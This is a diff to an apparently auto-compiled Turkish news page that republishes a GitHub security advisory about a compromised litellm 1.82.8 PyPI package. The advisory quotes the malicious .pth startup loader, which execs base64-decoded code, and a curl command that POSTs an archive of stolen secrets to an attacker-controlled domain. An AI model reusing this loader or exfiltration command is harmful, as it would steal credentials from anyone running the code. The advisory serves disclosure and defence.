@@ -6,11 +6,13 @@ tags: ["Gündem", "Hacker News", "Developer"]
 category: "Gündem"
 ---
 
+![Tell HN: Litellm 1.82.7 and 1.82.8 on PyPI are compromised](https://opengraph.githubassets.com/45bab17509deaf2f2ced78d22292ed8782747108c12ea0ee2e2714b721c2350f/BerriAI/litellm/issues/24512)
+
+> **Kaynak:** Hacker News  &nbsp;·&nbsp;  **Puan:** 169
+
 **[LITELLM TEAM] - For updates from the team, please see: #24518 [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 PyPI package — credential stealer Summary The litellm==1.82.8 wheel...**
 
-BerriAI / litellm Public Uh oh! There was an error while loading. Please reload this page .
-
-Notifications You must be signed in to change notification settings Fork 6.7k Star 40.2k [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer #24512 New issue Copy link New issue Copy link Open Open [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer #24512 Copy link Labels llm translation potential-duplicate Description isfinne opened on Mar 24, 2026 Issue body actions [LITELLM TEAM] - For updates from the team, please see: #24518 [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 PyPI package — credential stealer Summary The litellm==1.82.8 wheel package on PyPI contains a malicious .pth file ( litellm_init.pth , 34,628 bytes) that automatically executes a credential-stealing script every time the Python interpreter starts — no import litellm required.
+The litellm==1.82.8 wheel package on PyPI contains a malicious .pth file ( litellm_init.pth , 34,628 bytes) that automatically executes a credential-stealing script every time the Python interpreter starts — no import litellm required.
 
 This is a supply chain compromise. The malicious file is listed in the package's own RECORD :
 
@@ -18,17 +20,18 @@ litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628 Reprod
 
 import os , subprocess , sys ; subprocess . Popen ([ sys . executable , "-c" , "import base64; exec(base64.b64decode('...'))" ]) Malicious Behavior (full analysis) The payload is double base64-encoded . When decoded, it performs the following:
 
-## İçerik Başlıkları
+curl -s -o /dev/null -X POST \ " https://models.litellm.cloud/ " \ -H " Content-Type: application/octet-stream " \ -H " X-Filename: tpcp.tar.gz " \ --data-binary @tpcp.tar.gz Key Technical Details Trigger mechanism : .pth files in site-packages/ are executed automatically by the Python interpreter on startup (see Python docs on .pth files ). No import statement is needed. Stealth : The payload is double base64-encoded, making it invisible to naive source code grep. Exfiltration target : https://models.litellm.cloud/ — note the domain litellm.cloud (NOT litellm.ai , the official domain). RSA public key (first 64 chars): MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+... Impact Anyone who installed litellm==1.82.8 via pip has had all environment variables, SSH keys, cloud credentials, and other secrets collected and sent to an attacker-controlled server.
+
+## Yazıda Neler Var?
 
 - Uh oh!
-- Description
 - [LITELLM TEAM] - For updates from the team, please see: #24518
-- Summary
+- Reproduction
+- Malicious Behavior (full analysis)
+- Impact
 
 ---
 
-**Kaynak:** Hacker News &nbsp;·&nbsp; **Puan:** 163
+[Orijinal makaleyi oku →](https://github.com/BerriAI/litellm/issues/24512) &nbsp;·&nbsp; [Hacker News tartışması →](https://news.ycombinator.com/item?id=47501426)
 
-[Orijinal makaleyi oku](https://github.com/BerriAI/litellm/issues/24512) &nbsp;·&nbsp; [Hacker News tartışması](https://news.ycombinator.com/item?id=47501426)
-
-_Bu içerik otomatik olarak derlenmektedir. Kaynak bağlantıları orijinal yayıncılara aittir._
+_Bu içerik otomatik olarak derlenmektedir. Tüm haklar orijinal yayıncıya aittir._
